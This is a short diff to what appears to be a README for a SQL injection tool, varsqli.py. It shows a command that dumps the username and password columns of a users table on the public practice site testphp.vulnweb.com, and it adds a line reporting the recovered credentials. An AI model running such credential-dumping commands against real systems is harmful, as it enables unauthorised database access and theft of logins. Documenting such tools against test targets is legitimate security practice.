@@ -74,3 +74,4 @@ $ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --colu
 python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --dump-all -T users -C pass,uname
 ```
 - this command I will dump the `password` and `uname` to get the username and password
+- here is the result, password and user are test and test
